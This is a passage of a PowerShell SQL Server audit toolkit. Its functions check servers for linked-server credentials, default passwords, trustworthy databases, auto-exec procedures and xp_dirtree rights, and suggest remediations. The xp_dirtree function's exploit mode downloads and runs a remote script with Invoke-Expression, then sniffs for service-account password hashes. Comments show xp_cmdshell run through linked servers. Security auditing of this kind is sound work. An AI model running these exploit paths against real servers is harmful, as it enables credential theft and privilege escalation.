        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Linked Server'
        $Description   = 'One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote server.'
        $Remediation   = "Configure SQL Server links to connect to remote servers using the login's current security context."
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        if($Username)
        {
            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Username $Username -Password $Password -Exploit"
        }
        else
        {
            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Exploit"
        }
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms190479.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials
        $LinkedServers = Get-SQLServerLink -Verbose -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | 
        Where-Object { $_.LocalLogin -ne 'Uses Self Credentials' -and ([string]$_.RemoteLoginName).Length -ge 1}

        # Update vulnerable status
        if($LinkedServers)
        {
            $IsVulnerable  = 'Yes'
            $LinkedServers |
            ForEach-Object -Process {
                $Details = 
                $LinkName = $_.DatabaseLinkName
                $LinkUser = $_.RemoteLoginName
                $LinkAccess = $_.is_data_access_enabled
                $ExploitCmd = "Example query: SELECT * FROM OPENQUERY([$LinkName],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')"

                if($LinkUser -and $LinkAccess -eq 'True')
                {
                    Write-Verbose -Message "$Instance : - The $LinkName linked server was found configured with the $LinkUser login."
                    $Details = "The SQL Server link $LinkName was found configured with the $LinkUser login."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No exploitable SQL Server links were found."
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}

Function  Invoke-SQLAuditDefaultLoginPw
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Default SQL Server Login Password"

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Default SQL Server Login Password'
        $Description   = 'The target SQL Server instance is configured with a default SQL login and password used by a common application.'
        $Remediation   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $Instance -Q `"Select @@Version`" -Username test -Password test."
        $Details       = ''
        $Reference     = 'https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Check for default passwords
        $Results = Get-SQLServerLoginDefaultPw -Verbose -Instance $Instance 

        if($Results){
            $IsVulnerable = "Yes"
            $IsExploitable = "Yes"
        }

        # Create report records
        $Results | 
        ForEach-Object {
            $DefaultComputer = $_.Computer
            $DefaultInstance = $_.Instance
            $DefaultUsername = $_.Username
            $DefaultPassword = $_.Password
            $DefaultIsSysadmin = $_.IsSysadmin

            # Check if sysadmin
            
            # Add record            
            $Details = "Default credentials found: $DefaultUsername / $DefaultPassword (sysadmin: $DefaultIsSysadmin)."
            $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $DefaultInstance -Q `"Select @@Version`" -Username $DefaultUsername -Password $DefaultPassword"
            $null = $TblData.Rows.Add($DefaultComputer, $DefaultInstance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                        
        }        
        
        #Status user
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password"
    }
    End
    {           
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLAuditPrivTrustworthy
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Trustworthy Database'
        $Description   = 'One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server.'
        $Remediation   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials
        $TrustedDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.DatabaseName -ne 'msdb' -and $_.is_trustworthy_on -eq 'True'
        }

        # Update vulnerable status
        if($TrustedDatabases)
        {
            $IsVulnerable  = 'Yes'
            $TrustedDatabases |
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName

                Write-Verbose -Message "$Instance : - The database $DatabaseName was found configured as trustworthy."
                $Details = "The database $DatabaseName was found configured as trustworthy."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default trusted databases were found."
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function  Invoke-SQLAuditPrivAutoExecSp
{
    <#
            .SYNOPSIS
            Check if any databases have been configured as trustworthy.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\>  Invoke-SQLAuditPrivAutoExecSp -Instance SQLServer1\STANDARDDEV2014

            .EXAMPLE
            PS C:\>  Invoke-SQLInstanceLocal | Invoke-SQLAuditPrivAutoExecSp -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblAutoExecPrivs = new-object System.Data.DataTable 
        $TblAutoExecPrivs.Columns.add('ComputerName') | Out-Null
        $TblAutoExecPrivs.Columns.add('Instance') | Out-Null
        $TblAutoExecPrivs.Columns.add('DatabaseName') | Out-Null
        $TblAutoExecPrivs.Columns.add('SchemaName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureType') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureDefinition') | Out-Null
        $TblAutoExecPrivs.Columns.add('SQL_DATA_ACCESS') | Out-Null
        $TblAutoExecPrivs.Columns.add('ROUTINE_BODY') | Out-Null    
        $TblAutoExecPrivs.Columns.add('CREATED') | Out-Null         
        $TblAutoExecPrivs.Columns.add('LAST_ALTERED') | Out-Null    
        $TblAutoExecPrivs.Columns.add('is_ms_shipped') | Out-Null   
        $TblAutoExecPrivs.Columns.add('is_auto_executed') | Out-Null 
        $TblAutoExecPrivs.Columns.add('PrincipalName') | Out-Null
        $TblAutoExecPrivs.Columns.add('PrincipalType') | Out-Null
        $TblAutoExecPrivs.Columns.add('PermissionName') | Out-Null
        $TblAutoExecPrivs.Columns.add('PermissionType') | Out-Null
        $TblAutoExecPrivs.Columns.add('StateDescription') | Out-Null
        $TblAutoExecPrivs.Columns.add('ObjectName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ObjectType') | Out-Null

        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Auto Execute Stored Procedure'
        $Description   = 'A stored procedured is configured for automatic execution and has explicit permissions assigned.  This may allow non sysadmin logins to execute queries as "sa" when the SQL Server service is restarted.'
        $Remediation   = "Ensure that non sysadmin logins do not have privileges to ALTER stored procedures configured with the is_auto_executed settting set to 1."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        $IsVulnerable  = 'Yes'

        # Get list of autoexec stored procedures
        $AutoProcs = Get-SQLStoredProcedureAutoExec -Verbose -Instance $Instance -Username $username -Password $password -Credential $credential 

        # Get count
        $AutoCount = $AutoProcs | measure | select count -ExpandProperty count

        if($AutoCount -eq 0){
            Write-Verbose "$Instance : No stored procedures were found configured to auto execute."
            return
        }

        # Get permissions for procs
        Write-Verbose "$Instance : Checking permissions..."
        $AutoProcs | 
        foreach-object {
    
            # Grab autoexec proc info
            $ComputerName = $_.ComputerName
            $Instance = $_.Instance
            $DatabaseName = $_.DatabaseName
            $SchemaName = $_.SchemaName
            $ProcedureName = $_.ProcedureName
            $ProcedureType = $_.ProcedureType
            $ProcedureDefinition = $_.ProcedureDefinition
            $SQL_DATA_ACCESS = $_.SQL_DATA_ACCESS
            $ROUTINE_BODY = $_.ROUTINE_BODY
            $CREATED = $_.CREATED
            $LAST_ALTERED = $_.LAST_ALTERED
            $is_ms_shipped = $_.is_ms_shipped
            $is_auto_executed = $_.is_auto_executed    

            # Get a list of explicit permissions 
	        $Results = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
            Where-Object {$_.objectname -like "$ProcedureName"}

            # Check if any permisssions exist
            $PermCount = $Results | measure | select count -ExpandProperty count

            # Add record
            if($PermCount -ge 1){

                # Itererate through each permission
                $Results | 
                ForEach-Object {

                    # Grab permission info
                    $PrincipalName = $_.PrincipalName
                    $PrincipalType = $_.PrincipalType
                    $PermissionName = $_.PermissionName
                    $PermissionType = $_.PermissionType
                    $StateDescription = $_.StateDescription
                    $ObjectType = $_.ObjectType
                    $ObjectName = $_.ObjectName

                    $FullSpName = "$DatabaseName.$SchemaName.$ProcedureName"
        
                    # Add row to results
                    $TblAutoExecPrivs.Rows.Add(
                        $ComputerName,
                        $Instance,
                        $DatabaseName,
                        $SchemaName,
                        $ProcedureName,
                        $ProcedureType,
                        $ProcedureDefinition,
                        $SQL_DATA_ACCESS,
                        $ROUTINE_BODY,
                        $CREATED,
                        $LAST_ALTERED,
                        $is_ms_shipped,
                        $is_auto_executed,
                        $PrincipalName,
                        $PrincipalType,
                        $PermissionName,
                        $PermissionType,
                        $StateDescription,
                        $ObjectName,
                        $ObjectType
                    ) | Out-Null

                    Write-Verbose -Message "$Instance : - $PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $Details = "$PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)            
                }
            }
        }

        #$TblAutoExecPrivs       

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin
        $IsExploitable = "Unknown"

        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}



Function Invoke-SQLAuditPrivXpDirtree
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Execute xp_dirtree'
        $Description   = 'xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $Remediation   = 'Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get users and roles that execute xp_dirtree
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_dirtree' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Update vulnerable status
        if($DirTreePrivs)
        {
            # Status user
            Write-Verbose -Message "$Instance : - At least one principal has EXECUTE privileges on xp_dirtree."

            $IsVulnerable  = 'Yes'

            if($Exploit){
                # Check if the current process has elevated privs
                # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
                $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                $IsAdmin = $prp.IsInRole($adm)
            
                if(-not $IsAdmin)
                {
                    Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                    $IAMADMIN = 'No'
                }else{
                    Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                    $IAMADMIN = 'Yes'
                }
            }
            
            $DirTreePrivs |
            ForEach-Object -Process {
                $PrincipalName = $DirTreePrivs.PrincipalName

                # Check if current login can exploit
                $CurrentPrincpalList |
                ForEach-Object -Process {
                    $PrincipalCheck = $_

                    if($PrincipalName -eq $PrincipalCheck -or $PrincipalName -eq 'public')
                    {
                        $IsExploitable  = 'Yes'                      

                        # Check for exploit flag
                        if(($IAMADMIN -eq 'Yes') -and ($Exploit))
                        {
                            # Attempt to load Inveigh from file
                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue | Out-Null
                            #Invoke-Expression($InveighSrc)

                            # Get IP of current system
                            if(-not $AttackerIp)
                            {
                                $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                                    Select-Object -ExpandProperty Ipv4Address |
                                Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                                if($AttackerIp -eq '127.0.0.1')
                                {
                                    $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                    Select-Object -First 1 -Property @{
                                        Name       = 'IPAddress'
                                        Expression = {
                                            [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
                                        }
                                    } |
                                    Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                                }
                            }

                            # Attempt to load Inveigh via reflection
                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Get IP of SQL Server instance
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)

                                # Start sniffing for hashes from that IP
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp

                                # Randomized 5 character file name
